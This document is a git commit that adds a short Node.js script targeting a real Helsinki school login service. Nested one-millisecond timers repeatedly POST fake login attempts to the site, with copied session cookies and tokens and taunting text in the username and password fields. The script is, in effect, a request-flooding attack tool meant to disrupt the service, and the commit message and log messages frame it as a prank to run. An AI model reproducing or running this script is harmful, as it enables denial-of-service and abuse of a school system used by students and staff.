ba35ead857fb7fe13a9054201b15a2183fbe466c
base-alex <118537260+base-alex@users.noreply.github.com>
2024-03-26 20:35:55 +0200

    Create hiilitynnyriv1.js
    run with da nodejs and bom you got da hiili tynnyri ouimaigoash

---
+++ hiilitynnyriv1.js
@@ -0,0 +1,29 @@
+function goofyahh() {
+ setInterval(() => {
+ fetch("https://helsinki.inschool.fi/?loginfailed", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "accept-language": "en,en-AU;q=0.9,en-US;q=0.8",
+    "cache-control": "max-age=0",
+    "content-type": "application/x-www-form-urlencoded",
+    "sec-ch-ua": "\"Chrome\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Chrome OS\"",
+    "sec-fetch-dest": "document",
+    "sec-fetch-mode": "navigate",
+    "sec-fetch-site": "same-origin",
+    "sec-fetch-user": "?1",
+    "upgrade-insecure-requests": "1",
+    "cookie": "Wilma2LoginID=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjcwNTZDMjI3LUVFQjEtNEEzRC1CNDNBLTZDNzQ2OUI3NjM1NCIsImV4cCI6MTcxMTQ4NzExOSwiaWF0IjoxNzExNDc2MzE5LCJjbmYiOnsia2lkIjoiM0Q1MzM3NzMtNThDRS00RkU0LTgyM0YtQ0NCRjJEODE5MTcxIn19.NmRmMTUxMmM0ODgzMmJmYjQxMzFjYWMwYWM1NjkzMjBkOWFkNTJhNTFlZWYzMjJkZDQ0MzIyYjQ2ZmQ3YzNlOQ",
+    "Referer": "https://helsinki.inschool.fi/",
+    "Referrer-Policy": "same-origin"
+  },
+  "body": "Login=[Trolled By Humour Squad!]&Password=Herttoniemen-Rannan ala aste was here! Big Sis is Waitin For YA!&submit=Kirjaudu+sis%C3%A4%C3%A4n&SESSIONID=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjcwNTZDMjI3LUVFQjEtNEEzRC1CNDNBLTZDNzQ2OUI3NjM1NCIsImV4cCI6MTcxMTQ4NzExOSwiaWF0IjoxNzExNDc2MzE5LCJjbmYiOnsia2lkIjoiM0Q1MzM3NzMtNThDRS00RkU0LTgyM0YtQ0NCRjJEODE5MTcxIn19.NmRmMTUxMmM0ODgzMmJmYjQxMzFjYWMwYWM1NjkzMjBkOWFkNTJhNTFlZWYzMjJkZDQ0MzIyYjQ2ZmQ3YzNlOQ",
+  "method": "POST"
+ }); console.log("did fart xd")
+ }, 1);
+}
+setInterval(() => {
+    console.log('sent new warior :D')
+    goofyahh();
+}, 1)
